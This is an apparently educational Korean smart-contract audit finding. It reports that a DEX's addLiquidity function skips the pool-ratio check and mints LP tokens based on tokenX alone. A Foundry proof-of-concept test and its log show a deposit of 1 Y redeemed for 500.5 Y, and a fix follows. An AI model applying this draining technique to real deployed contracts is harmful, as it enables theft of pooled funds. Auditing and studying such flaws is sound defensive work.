## 서준원

## 1. No Imbalance Check on Add Liquidity(1)

### 설명

문제 코드: addLiquidity 함수 전체

유동성 공급 시 유동성 풀 내의 토큰 비율을 검사하지 않는다. 또한 LP토큰 발행량 계산시 tokenX의 양만을 고려해 발행하기 때문에, Y의 양을 아무리 적게 넣더라도 X의 양에 비례한 LPToken을 발행받는다.

```jsx

function addLiquidity ... {
	...
	if(totalSupply() == 0){ LPTokenAmount = tokenXAmount * tokenYAmount / 10**18;} else{ LPTokenAmount = totalSupply() * tokenXAmount / reserveX;}

	require(minimumLPTokenAmount <= LPTokenAmount)
	...
}
```

### 파급력

Critical

-   산정 이유
    -   접근성이 매우 높고 피해 규모 또한 크다.
-   공격 시나리오
    -   유동성 공급 이후 발행된 LP토큰으로 removeLiquidity를 수행하면 공급하지 않은 Y토큰까지 탈취가 가능하다.
    -   아래 코드에서 TokenY는 1 ether만 공급하지만 LP토큰으로 회수하는 양은 500.5 ether이다.
    ```jsx
    function testAddLiquidity() external {
      uint firstLPReturn = dex.addLiquidity(1000 ether, 1000 ether, 0);
      emit log_named_uint("firstLPReturn", firstLPReturn);

      uint secondLPReturn = dex.addLiquidity(1000 ether, 1 ether, 0);
      emit log_named_uint("secondLPReturn", secondLPReturn);

      (uint tx, uint ty) = dex.removeLiquidity(secondLPReturn, 0, 0);
      emit log_named_uint("second LP remove", tx);
      emit log_named_uint("second LP remove", ty);

      assertEq(tx, 1000 ether);
      assertEq(ty, 1 ether);
    }
    ```
    ```jsx
    [FAIL. Reason: Assertion failed.] testAddLiquidity1() (gas: 230416)
    Logs:
      firstLPReturn: 1000000000000000000000000
      secondLPReturn: 1000000000000000000000000
      second LP remove: 1000000000000000000000
      second LP remove: 500500000000000000000
      Error: a == b not satisfied [uint]
            Left: 500500000000000000000
           Right: 1000000000000000000
    ```
-   공격 난이도
    -   누구나 접근 가능하므로, 매우 쉽다.
-   발생할 수 있는 피해
    -   유동성 공급 여부와 상관없이 누구나 유동성 토큰을 발행할 수 있으며, 발행한 토큰의 양만큼 회수가 가능하다. 따라서 DEX에 공급된 자산 전부를 탈취할 수 있다.

### 해결 방안

-   addLiquidity 함수 실행시 유동성 풀에 있는 토큰의 비율을 검사하는 코드가 필요하다.

```jsx
require(reserveX * tokenYAmount == reserveY * tokenXAmount);
```
